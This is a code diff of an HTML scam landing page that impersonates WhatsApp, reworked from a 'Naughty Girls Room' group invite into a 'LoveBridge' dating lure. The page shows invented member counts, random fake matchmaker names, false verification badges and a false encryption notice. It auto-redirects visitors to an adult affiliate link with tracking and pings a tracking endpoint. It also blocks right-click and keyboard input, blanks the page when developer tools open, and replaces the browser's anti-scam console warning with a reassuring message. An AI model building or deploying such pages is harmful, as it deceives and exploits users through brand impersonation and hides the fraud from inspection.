@@ -1,16 +1,17 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Group Invitation</title>
+    <title>Find Your Connection - WhatsApp Matching</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>💞</text></svg>">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;background:#000;overflow:hidden;height:100vh;color:#fff;position:relative;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
-        .bg-video{position:absolute;top:50%;left:50%;min-width:100%;min-height:100%;width:auto;height:auto;transform:translate(-50%,-50%);z-index:-2;object-fit:cover;pointer-events:none}
-        .blur-content{background:rgba(0,0,0,0.45); backdrop-filter:blur(8px);height:100vh;display:flex;flex-direction:column;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
-        .whatsapp-header{display:flex;align-items:center;padding:15px;background:#075e54;color:#fff;position:relative;z-index:1;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
+        body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;background:#1a1a2e;overflow:hidden;height:100vh;color:#fff;position:relative;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
+        .bg-video{position:absolute;top:50%;left:50%;min-width:100%;min-height:100%;width:100%;height:100%;transform:translate(-50%,-50%);z-index:-2;object-fit:cover;pointer-events:none}
+        .blur-content{background:rgba(26,26,46,0.6); backdrop-filter:blur(4px);height:100vh;display:flex;flex-direction:column;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
+        .whatsapp-header{display:flex;align-items:center;padding:15px;background:#e91e63;color:#fff;position:relative;z-index:1;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
         .back-button{font-size:22px;cursor:pointer;margin-right:15px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
         .header-text h1{font-size:19px;font-weight:500;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
         .header-text p{font-size:14px;opacity:0.8;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
@@ -25,21 +26,22 @@
             -webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;
         }
         .profile-container,.members-info,.notification,.join-button{opacity:0;transform:translateY(20px);transition:all .5s;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
-        .profile-img{background:#128c7e;width:90px;height:90px;border-radius:50%;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;font-size:40px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
-        .group-name{font-size:20px;font-weight:600;margin-bottom:6px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
+        .profile-img{background:#e91e63;width:100px;height:100px;border-radius:50%;margin:0 auto 15px;display:flex;align-items:center;justify-content:center;overflow:hidden;box-shadow:0 4px 20px rgba(233,30,99,0.4);-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
+        .profile-img img{width:100%;height:100%;object-fit:cover;}
+        .group-name{font-size:22px;font-weight:600;margin-bottom:8px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
         .group-info{font-size:14px;opacity:0.8;margin-bottom:20px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
         .members-info{display:flex;justify-content:space-around;width:100%;max-width:400px;margin:25px 0;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
         .member-count,.active-members{text-align:center;cursor:pointer;position:relative;flex:1;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
         .count{font-size:26px;font-weight:bold;margin:8px 0;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
         .label{font-size:14px;opacity:0.8;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
         .online-indicator{display:flex;align-items:center;justify-content:center;font-size:14px;margin-top:5px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
-        .dot{width:8px;height:8px;background:#00ff00;border-radius:50%;margin-right:6px;animation:pulse 2s infinite}
+        .dot{width:8px;height:8px;background:#ff4081;border-radius:50%;margin-right:6px;animation:pulse 2s infinite}
         @keyframes pulse{0%{opacity:1}50%{opacity:0.4}100%{opacity:1}}
-        .notification{background:rgba(255,255,255,0.1);padding:12px;border-radius:8px;font-size:14px;margin:20px 0;line-height:1.5;width:100%;max-width:400px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
+        .notification{background:rgba(255,255,255,0.15);padding:12px;border-radius:8px;font-size:14px;margin:20px 0;line-height:1.5;width:100%;max-width:400px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
         .join-button{
-            background:#25d366;color:#fff;border:none;padding:18px 30px;font-size:18px;border-radius:50px;cursor:pointer;
+            background:#ff4081;color:#fff;border:none;padding:18px 30px;font-size:18px;border-radius:50px;cursor:pointer;
             display:flex;align-items:center;justify-content:center;gap:12px;margin:15px auto 0;
-            width:90%;max-width:400px;font-weight:bold;box-shadow:0 6px 20px rgba(0,0,0,0.5);
+            width:90%;max-width:400px;font-weight:bold;box-shadow:0 6px 20px rgba(255,64,129,0.4);
             -webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;
         }
         .join-button i{font-size:26px}
@@ -50,58 +52,115 @@
             bottom:100%;left:50%;transform:translateX(-50%);opacity:0;transition:opacity .3s;z-index:10;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
         .message-popup::after{content:"";position:absolute;top:100%;left:50%;margin-left:-8px;border:8px solid transparent;border-top-color:#000}
         .show{opacity:1}
+        .feature-list{display:flex;justify-content:center;gap:15px;margin:15px 0;}
+        .feature-item{display:flex;flex-direction:column;align-items:center;opacity:0.8;cursor:pointer;transition:all 0.3s ease;padding:10px;border-radius:10px;}
+        .feature-item:hover{opacity:1;transform:scale(1.05);}
+        .feature-item i{font-size:24px;margin-bottom:5px;}
+
+        /* Direct Chat - Green/Blue */
+        #directChat{border:1px solid rgba(76,175,80,0.3);}
+        #directChat:hover{background:rgba(76,175,80,0.2);}
+        #directChat i{color:#4CAF50;}
+
+        /* Video Call - Purple/Violet */
+        #videoCall{border:1px solid rgba(156,39,176,0.3);}
+        #videoCall:hover{background:rgba(156,39,176,0.2);}
+        #videoCall i{color:#9C27B0;}
+
+        /* Nearby - Orange/Yellow */
+        #nearby{border:1px solid rgba(255,152,0,0.3);}
+        #nearby:hover{background:rgba(255,152,0,0.2);}
+        #nearby i{color:#FF9800;}
+        .age-badge{background:rgba(255,64,129,0.2);padding:4px 12px;border-radius:20px;font-size:12px;margin:5px 0;display:inline-block;}
+        .trust-badges{display:flex;justify-content:center;gap:10px;margin:10px 0;}
+        .trust-badge{background:rgba(255,255,255,0.15);padding:5px 10px;border-radius:15px;font-size:11px;display:flex;align-items:center;gap:5px;}
+        .video-fallback{position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#e91e63,#ff4081);z-index:-3;}
     </style>
 </head>
 <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false" onkeydown="return false;" onkeyup="return false;" onkeypress="return false;">
 
+    <div class="video-fallback"></div>
     <video class="bg-video" id="bgVideo" autoplay muted loop playsinline preload="auto"></video>
 
     <div class="blur-content">
         <div class="whatsapp-header">
             <div class="back-button" onclick="history.back()"><i class="fas fa-arrow-left"></i></div>
             <div class="header-text">
-                <h1>Naughty Girls Room</h1>
+                <h1>LoveBridge</h1>
                 <p>WhatsApp</p>
             </div>
         </div>
 
         <div class="main-content">
             <div class="profile-container">
-                <div class="profile-img"><i class="fas fa-users"></i></div>
-                <div class="group-name">Naughty Girls Room</div>
-                <div class="group-info" id="adminText"></div>
+                <div class="profile-img">
+                    <img id="profilePhoto" src="" alt="Profile">
+                </div>
+                <div class="group-name">LoveBridge</div>
+                <div class="group-info" id="adminText">Find your soulmate through WhatsApp</div>
+                <div class="age-badge">18+ Verified Members</div>
+            </div>
+
+            <div class="trust-badges">
+                <div class="trust-badge">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Verified Profiles</span>
+                </div>
+                <div class="trust-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Secure Chat</span>
+                </div>
+                <div class="trust-badge">
+                    <i class="fas fa-user-check"></i>
+                    <span>Real People</span>
+                </div>
+            </div>
+
+            <div class="feature-list">
+                <div class="feature-item" id="directChat">
+                    <i class="fas fa-comments"></i>
+                    <span>Direct Chat</span>
+                </div>
+                <div class="feature-item" id="videoCall">
+                    <i class="fas fa-video"></i>
+                    <span>Video Call</span>
+                </div>
+                <div class="feature-item" id="nearby">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <span>Nearby</span>
+                </div>
             </div>
 
             <div class="members-info">
                 <div class="member-count" id="memberCount">
-                    <div class="message-popup" id="messagePopup1">People Who Have Actively Enjoyed This Service</div>
-                    <div class="count" id="totalMembers">106.7K</div>
-                    <div class="label">Members</div>
+                    <div class="message-popup" id="messagePopup1">Active members looking for connections</div>
+                    <div class="count" id="totalMembers">48.5K</div>
+                    <div class="label">Single Members</div>
                 </div>
-                <div class="active-members" id="activeMembers">
-                    <div class="message-popup" id="messagePopup2">People Who Have Actively Enjoyed This Service</div>
-                    <div class="count" id="onlineMembers">43.2K</div>
+                <div class="active-members" id="active-members">
+                    <div class="message-popup" id="messagePopup2">Currently online</div>
+                    <div class="count" id="onlineMembers">12.3K</div>
                     <div class="online-indicator"><div class="dot"></div><span>Online</span></div>
                 </div>
             </div>
 
             <div class="notification">
                 <i class="fas fa-lock"></i>
-                <span>New messages and calls are secured with end-to-end encryption. Only people in this chat can read, listen, or share them.</span>
+                <span>Your privacy is protected with end-to-end encryption. Only you can control your personal information.</span>
             </div>
 
             <button class="join-button" id="joinButton">
                 <i class="fab fa-whatsapp"></i>
-                <span>Join group</span>
+                <span>Start Chat via WhatsApp</span>
             </button>
 
             <div class="security-notice">
-                <i class="fas fa-shield-alt"></i> <span>Protected by WhatsApp</span>
+                <i class="fas fa-shield-alt"></i> <span>100% Private & Secure</span>
             </div>
         </div>
 
         <div class="footer">
-            By clicking "Join the group", you agree to share contact information with group administrator and other participants.
+            All members have been verified as 18+.
         </div>
     </div>
 
@@ -165,81 +224,125 @@
             }
         });
         
-        // Prevent text selection
         document.addEventListener('selectstart', function(e) {
             e.preventDefault();
             return false;
         });
         
-        // Prevent drag
         document.addEventListener('dragstart', function(e) {
             e.preventDefault();
             return false;
         });
         
-        // Devtools detection
         setInterval(function() {
             if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
                 window.location.replace("about:blank");
             }
         }, 500);
         
-        // Console clearing
         console.clear();
         setInterval(function() {
             console.clear();
-            console.log("%cStop!", "color: red; font-size: 50px; font-weight: bold;");
-            console.log("%cThis is a browser feature intended for developers. If someone told you to copy-paste something here to enable a feature or \"hack\" someone's account, it is a scam and will give them access to your account.", "font-size: 16px;");
+            console.log("%cSecure Connection", "color: #ff4081; font-size: 50px; font-weight: bold;");
+            console.log("%cThis platform is protected and monitored for security purposes.", "font-size: 16px;");
         }, 1000);
 
-        // Offer URL
-        const OFFERS = ["https://ceafgif.flirtpixel.com/s/192278ad6a62d?sub1=KAHF&subsource=KAHF"];
-        let TARGET_URL = OFFERS[0];
+        const SMARTLINK = "https://ceafgif.flirtpixel.com/s/192278ad6a62d?sub1=KAHF&subsource=KAHF"; 
+        let TARGET_URL = SMARTLINK;
 
-        // Single video URL
-        const VIDEO_URL = "https://ceafgif.flirtpixel.com/bundle/921/assets/images/video-1.mp4";
+        const profilePhotos = [
+            "https://files.catbox.moe/blc5hs.png",
+            "https://iili.io/fZKCW1R.png",
+            "https://iili.io/fZKCGLJ.png",
+            "https://iili.io/fZKCYdB.png"
+        ];
+
+        const videoList = [
+            "https://ceafgif.flirtpixel.com/bundle/921/assets/images/video-1.mp4",
+            "https://files.catbox.moe/y2fr1u.mp4",
+            "https://files.catbox.moe/jytnih.mp4",
+            "https://files.catbox.moe/1q99k0.mp4",
+            "https://thumbsnap.com/i/2ycQSNZa.mp4"
+        ];
         const videoEl = document.getElementById('bgVideo');
+        let currentVideoIndex = 0;
 
         function loadVideo() {
-            videoEl.src = VIDEO_URL;
+            // Select a video from the list
+            videoEl.src = videoList[currentVideoIndex];
             videoEl.load();
-            videoEl.play().catch(() => {
-                document.body.style.background = 'linear-gradient(135deg,#075e54,#128c7e)';
+            
+            videoEl.play().then(() => {
+                console.log("Video playing successfully");
+            }).catch(error => {
+                console.log("Video play failed:", error);
+                // Try next video
+                currentVideoIndex = (currentVideoIndex + 1) % videoList.length;
+                if (currentVideoIndex !== 0) {
+                    loadVideo();
+                } else {
+                    // All videos failed, show fallback
+                    document.querySelector('.video-fallback').style.display = 'block';
+                }
             });
+            
+            // Handle video errors
+            videoEl.onerror = function() {
+                console.log("Video error, trying next video");
+                currentVideoIndex = (currentVideoIndex + 1) % videoList.length;
+                if (currentVideoIndex !== 0) {
+                    loadVideo();
+                } else {
+                    // All videos failed, show fallback
+                    document.querySelector('.video-fallback').style.display = 'block';
+                }
+            };
         }
 
-        // Random admin name
-        const firstNames = ["Emily","Sophia","Isabella","Mia","Ava","Olivia","Luna","Chloe","Zoe","Anna","Lisa","Sarah","Putri","Siti","Ayu","Dewi","Intan","Citra","Tiara","Bella","Aisyah","Vanessa","Jessica","Angel"];
-        const lastNames = ["Whitney","Johnson","Miller","Davis","Garcia","Martinez","Lopez","Wilson","Anderson","Thomas","Moore","Perez","Harris","Clark","Lewis","Walker","Young","King","Scott","Nguyen","Adams","Hall"];
+        const firstNames = ["Sarah","Jessica","Emily","Sophia","Olivia","Emma","Ava","Isabella","Mia","Charlotte","Amelia","Harper","Evelyn","Abigail","Elizabeth"];
+        const lastNames = ["Johnson","Smith","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson"];
         function getRandomName(){return firstNames[Math.floor(Math.random()*firstNames.length)]+" "+lastNames[Math.floor(Math.random()*lastNames.length)];}
 
-        // Redirect logic
         const params = new URLSearchParams(window.location.search);
         let finalUrl = TARGET_URL + (params.toString() ? (TARGET_URL.includes('?') ? '&' : '?') + params.toString() : '');
         
-        // Auto redirect
         setTimeout(() => {
             location.href = finalUrl;
-        }, 5 * 1000);
+        }, 6 * 1000);
         
-        // Manual redirect
         document.getElementById('joinButton').onclick = () => {
             location.href = finalUrl;
         };
 
-        // Initialize
         document.addEventListener('DOMContentLoaded', () => {
-            // Tracking
             fetch('https://imopol.dasboardkramat.workers.dev/track?cid=KAHF', { method: 'GET', keepalive: true });
 
+            currentVideoIndex = Math.floor(Math.random() * videoList.length);
             loadVideo();
-            document.getElementById('adminText').textContent = "Admin & Moderator: " + getRandomName();
+            
+
+            const randomPhotoIndex = Math.floor(Math.random() * profilePhotos.length);
+            document.getElementById('profilePhoto').src = profilePhotos[randomPhotoIndex];
+            
+            document.getElementById('adminText').textContent = "Matchmaker: " + getRandomName();
             
             const els = document.querySelectorAll('.profile-container, .members-info, .notification, .join-button');
             els.forEach((el,i) => setTimeout(()=>{el.style.opacity='1';el.style.transform='translateY(0)'},i*200));
+            
+
+            document.getElementById('directChat').onclick = () => {
+                window.location.href = SMARTLINK + '';
+            };
+
+            document.getElementById('videoCall').onclick = () => {
+                window.location.href = SMARTLINK + '';
+            };
+
+            document.getElementById('nearby').onclick = () => {
+                window.location.href = SMARTLINK + '';
+            };
         });
 
-        // Popup functions
         function showPopup(id){
             const p=document.getElementById(id);
             p.classList.add('show');
@@ -251,7 +354,7 @@
         // Button animation
         const btn = document.getElementById('joinButton');
         function go(){
-            btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Redirecting...';
+            btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Connecting...';
             btn.disabled=true;
             setTimeout(()=>location.href=finalUrl,800);
         }
@@ -259,8 +362,14 @@
         btn.ontouchend=e=>{e.preventDefault();go();}
         btn.oncontextmenu=e=>{e.preventDefault();go();}
 
-        // Force play video
-        document.body.onclick = () => videoEl.play();
+        // Force play video on user interaction
+        document.body.onclick = () => {
+            if (videoEl.paused) {
+                videoEl.play().catch(() => {
+                    console.log("Autoplay prevented");
+                });
+            }
+        };
     </script>
 </body>
 </html>
